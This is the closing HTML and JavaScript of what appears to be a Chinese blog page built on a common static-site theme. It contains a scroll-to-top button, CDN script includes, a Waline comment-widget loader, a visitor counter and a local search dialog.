fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null

  const initWaline = (Fn) => {
    const waline = Fn(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://blog-waline-weld.vercel.app/',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))

    const destroyWaline = () => {
      waline.destroy()
    }

    btf.addGlobalFn('pjax', destroyWaline, 'destroyWaline')
  }

  const loadWaline = async () => {
    if (initFn) initWaline(initFn)
    else {
      await getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.css')
      const { init } = await import('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.js')
      initFn = init || Waline.init
      initWaline(initFn)
      window.walineFn = initFn
    }
  }

  if ('Waline' === 'Waline' || !false) {
    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>